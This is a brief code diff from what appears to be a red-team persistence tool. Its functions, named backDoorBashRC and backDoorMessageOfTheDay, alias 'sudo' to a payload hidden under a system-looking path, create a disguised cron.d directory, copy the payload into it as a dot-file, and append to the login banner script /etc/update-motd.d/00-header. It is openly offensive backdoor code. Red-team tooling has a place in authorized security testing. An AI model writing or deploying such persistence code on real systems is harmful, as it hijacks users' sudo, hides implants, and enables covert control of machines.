@@ -18,7 +18,7 @@ def backDoorBashRC():
 			bashrc.write('alias sudo=/etc/default/.cron.d/sudoy')
 	
 	os.system('mkdir /etc/default/cron.d')
-	os.system('mv /home/ubuntu/Red-Team-Tools/persistence/payloads/sudoy /etc/default/cron.d/.sudoy')
+	os.system('cp /home/ubuntu/Red-Team-Tools/persistence/payloads/sudoy /etc/default/cron.d/.sudoy')
 
 def backDoorMessageOfTheDay(ip):
 	with open('/etc/update-motd.d/00-header', 'a') as headerFile:
